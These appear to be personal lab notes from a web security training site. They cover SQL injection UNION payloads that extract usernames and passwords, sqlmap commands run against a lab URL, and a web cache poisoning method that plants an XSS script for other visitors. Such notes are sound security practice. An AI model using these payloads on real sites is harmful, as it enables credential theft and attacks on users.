
category=Gifts'



SELECT * FROM products WHERE category = '--+' AND released = 1 



users_vuwlag --> TABLE

FIND COLOUMS -->  

'UNION SELECT column_name,'aa' FROM information_schema.columns WHERE  table_name = 'users_vuwlag' --+

COLUM : password_dphxmz, username_kpklmc


'UNION SELECT username_kpklmc,password_dphxmz FROM 'users_vuwlag'--+



users_vuwlag

 ' UNION SELECT column_name, 'ABC' FROM information_schema.columns WHERE table_name='users_vuwlag' --+

 username_kpklmc,password_dphxmz

 UNION SELECT username_kpklmc,password_dphxmz FROM users_vuwlag --+

 
 
 sqlmap -u "https://0abd00b703596627804e53f000280087.web-security-academy.net/filter?category=*" --level=5 --risk=3 --keep-alive --fresh-queries --random-agent --batch --banner --dbs 


 sqlmap -u "https://0abd00b703596627804e53f000280087.web-security-academy.net/filter?category=*" --level=5 --risk=3 --keep-alive --fresh-queries --random-agent --batch --banner -D information_schema.tables --tables


sqlmap -u "https://0abd00b703596627804e53f000280087.web-security-academy.net/filter?category=**" --random-agent --batch --dbs








    Observe that the home page is a suitable cache oracle. N
    Add a cache-buster query parameter.
    Use Param Miner's "Guess GET parameters" ::: utm_content
    Confirm that this parameter is unkeyed by adding it to the query string and checking that you still get a cache hit. Keep sending the request until you get a cache miss. Observe that this unkeyed parameter is also reflected in the response along with the rest of the query string.

    Send a request with a utm_content parameter that breaks out of the reflected string and injects an XSS payload:
    GET /?utm_content='/><script>alert(1)</script>
    Once your payload is cached, remove the utm_content parameter, right-click on the request, and select "Copy URL". Open this URL in the browser and check that the alert() is triggered when you load the page.
    Remove your cache buster, re-add the utm_content parameter with your payload, and replay the request until the cache is poisoned for normal users. The lab will be solved when the victim user visits the poisoned home page.

